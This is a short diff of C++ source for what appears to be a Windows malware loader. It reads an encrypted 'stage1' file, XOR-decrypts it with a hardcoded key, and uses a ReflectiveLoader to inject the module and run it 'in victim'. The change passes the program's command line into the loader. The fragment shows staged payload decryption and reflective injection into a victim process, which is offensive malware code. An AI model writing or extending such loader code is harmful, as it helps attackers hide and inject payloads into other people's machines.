@@ -26,7 +26,7 @@ int wWinMain(
         ByteVector stage1_encrypted = stage1_encrypted_file.read(stage1_encrypted_file.size());
         ByteVector stage1 = simple_encryption::xor_bytes_with_hardcoded_key(stage1_encrypted);
 
-        ReflectiveLoader stage1_loader(stage1);
+        ReflectiveLoader stage1_loader(stage1, lpCmdLine);
         stage1_loader.inject_module();
         stage1_loader.run_module_in_victim();
 
